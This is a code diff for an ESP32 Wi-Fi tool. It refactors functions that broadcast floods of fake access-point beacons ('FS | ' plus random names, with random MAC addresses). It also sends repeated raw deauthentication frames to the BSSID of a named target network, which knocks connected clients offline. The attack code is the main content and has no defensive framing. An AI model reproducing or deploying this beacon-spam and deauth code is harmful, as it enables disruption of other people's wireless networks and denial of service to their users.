@@ -6,8 +6,44 @@ extern Led led;
 class WifiManager
 {
 public:
-	WifiManager() {
-		// switchChannel();
+	WifiManager() {}
+
+	bool init() {
+		try {
+			this->cfg = WIFI_INIT_CONFIG_DEFAULT();
+			this->ap_config.ap.ssid_hidden = 1;
+			this->ap_config.ap.channel = current_channel;
+			this->ap_config.ap.beacon_interval = 10000;
+			this->ap_config.ap.ssid_len = 0;
+
+			esp_wifi_set_promiscuous(true);
+					
+			esp_wifi_init(&cfg);
+			esp_wifi_set_storage(WIFI_STORAGE_RAM);
+			esp_wifi_set_mode(WIFI_MODE_AP);
+			esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+			esp_wifi_start();
+			esp_wifi_set_channel(current_channel, WIFI_SECOND_CHAN_NONE);
+			// switchChannel();
+			return true;
+		} catch(...) {
+			return false; 
+		}
+	}
+
+	bool destroy() {
+		try {
+			esp_wifi_set_promiscuous(false);
+			WiFi.disconnect();
+			WiFi.mode(WIFI_OFF);
+			esp_wifi_set_mode(WIFI_MODE_NULL);
+			esp_wifi_stop();
+			esp_wifi_restore();
+			esp_wifi_deinit();
+			return true;
+		} catch(...) {
+			return false; 
+		}
 	}
 
 	void connectToWiFi(const char *ssid, const char *password)
@@ -34,13 +70,11 @@ public:
 
 	void spamAP()
 	{
-		for (int i = 1; i < 14; i++)
+		for (int i = 1; i < 5; i++)
 		{
 			String name = String("FS | ") + generateRandomString(10);
 			// createAccessPoint(name.c_str(), "");
-			createAndBroadcastBeacon(name.c_str());
-			// esp_wifi_set_channel(i, WIFI_SECOND_CHAN_NONE);
-			switchChannel();
+			createAndBroadcastBeacon(name);
 			l.log(Logger::INFO, String("Creating access point: ") + name);
 		}
 	}
@@ -73,6 +107,8 @@ public:
 
 private:
 	int current_channel = 1;
+	wifi_init_config_t cfg;
+    wifi_config_t ap_config;
 
 	void switchChannel() {
 		if (current_channel > 14)
@@ -115,6 +151,8 @@ private:
 		String targetMAC = getBSSID(targetSSID);
 		if (targetMAC.length() > 0)
 		{
+			l.log(Logger::INFO, "Sending deauth packet to " + targetMAC);
+			switchChannel();
 			for (int i = 0; i < numPackets; i++)
 			{
 				sendDeauthPacket(targetMAC.c_str());
@@ -159,23 +197,24 @@ private:
 		return macAddr;
 	}
 
-	void createAndBroadcastBeacon(const char *ssid) {
+	void createAndBroadcastBeacon(String ssid) {
 		// Calculate the length of the SSID (including '\n') and set it in the beacon frame.
 		switchChannel();
-		int ssidLen = strlen(ssid);
-		beaconPacket[38] = ssidLen;
+		int ssidLen = ssid.length();
+		beaconPacket[38] = static_cast<uint8_t>(ssidLen);
 
 		uint8_t* macAddr = randomMacAddress();
-		// write MAC address into beacon frame
+		// Write MAC address into the beacon frame
 		memcpy(&beaconPacket[10], macAddr, 6);
 		memcpy(&beaconPacket[16], macAddr, 6);
 
-		// reset SSID
+		// Reset SSID
 		char emptySSID[32];
-    	memcpy(&beaconPacket[38], emptySSID, 32);
+		memset(emptySSID, 0, sizeof(emptySSID));  // Clear emptySSID
+		memcpy(&beaconPacket[38], emptySSID, sizeof(emptySSID));
 
 		// Copy the SSID into the beacon frame.
-		memcpy(&beaconPacket[39], ssid, ssidLen);
+		ssid.getBytes((unsigned char*)&beaconPacket[39], ssidLen + 1);
 
 		int packetCounter = 0;
 		// Send the beacon frame multiple times for better broadcasting.
@@ -185,10 +224,10 @@ private:
 		}
 	}
 
+
+
 	void sendDeauthPacket(const char *targetMAC)
 	{
-		l.log(Logger::INFO, "Sending deauth packet to " + String(targetMAC));
-		switchChannel();
 		uint8_t packet[26] = {
 			0xc0, 0x00, 0x3a, 0x01,
 			0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
